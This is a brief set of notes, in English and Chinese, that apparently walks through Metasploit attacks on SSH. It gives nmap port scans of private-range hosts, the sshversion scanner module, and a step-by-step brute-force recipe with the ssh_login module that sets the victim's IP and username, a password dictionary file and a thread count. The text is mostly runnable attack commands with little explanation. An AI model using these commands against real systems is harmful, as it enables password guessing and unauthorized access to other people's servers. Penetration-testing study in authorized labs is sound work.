#Metasploit-ssh

---


msfconsole

nmap -p 22  192.168.42.43

search sshversion

use auxiliary/scanner/ssh/sshversion

show options

set rhosts 192.168.42.43

run
---
# 暴力破解

nmap -p 22 -sV 192.168.78.162

nmap进行批量扫描

msfconsole

search ssh_login，搜索对应模块。

use auxiliary/scanner/ssh/ssh_login。

show options

set rhosts 受害者Ip号

set username 受害者主机用户名

set pass_file 密码字典文件路径

set thread 线程数，用于进行破解密码的线程个数

show options，再次查看设置的信息是否完全

run
